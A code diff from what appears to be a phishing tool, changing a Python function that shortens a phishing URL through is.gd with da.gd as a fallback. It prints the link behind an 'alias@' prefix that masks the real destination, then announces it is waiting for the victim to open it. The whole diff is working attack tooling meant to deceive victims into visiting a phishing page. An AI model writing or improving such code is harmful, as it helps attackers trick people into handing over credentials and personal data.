@@ -88,9 +88,19 @@ try:
    def short(url,alias):
       try:
          import requests
-         x = requests.get(f'https://is.gd/create.php?format=json&url={url}')
-         r = x.json()
-         print(" [ * ] Phishing short link: "+alias+"@"+r["shorturl"].replace("https://",""))
+         def url_ok(url):
+            r = requests.head(url)
+            if r.status_code == 200:
+               return True
+            else:
+               return False   
+         if url_ok("https://is.gd"):
+            shortner = f'https://is.gd/create.php?format=simple&url={url}'
+         else:
+            shortner = f'https://da.gd/s/?url={url}'
+         x = requests.get(shortner)
+         r = x.text
+         print(" [ * ] Phishing short link: "+alias+"@"+r.replace("\n","").replace("https://",""))
          print('\n [ * ] Waiting for victim to open the link...')
       except:
          if(is_connected()):
